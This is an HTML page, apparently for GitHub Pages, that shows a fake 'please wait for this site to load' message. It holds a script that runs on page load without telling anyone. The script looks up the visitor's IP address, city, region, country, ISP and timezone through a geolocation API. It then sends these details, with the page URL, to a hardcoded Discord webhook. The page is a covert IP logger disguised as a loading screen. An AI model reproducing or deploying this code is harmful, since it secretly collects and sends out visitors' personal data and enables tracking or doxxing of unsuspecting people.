<h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>



<script>
window.addEventListener("load", async () => {
  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const payload = {
      content:
        `üåç Visit Detected\n\n` +
        `IP: ${data.ip}\n` +
        `City: ${data.city}\n` +
        `Region: ${data.region}\n` +
        `Country: ${data.country_name}\n` +
        `ISP: ${data.org}\n` +
        `Timezone: ${data.timezone}\n` +
        `Page: ${window.location.href}`
    };

    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors", // üëà important for GitHub Pages
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

  } catch (err) {
    console.error("Error:", err);
  }
});
</script>
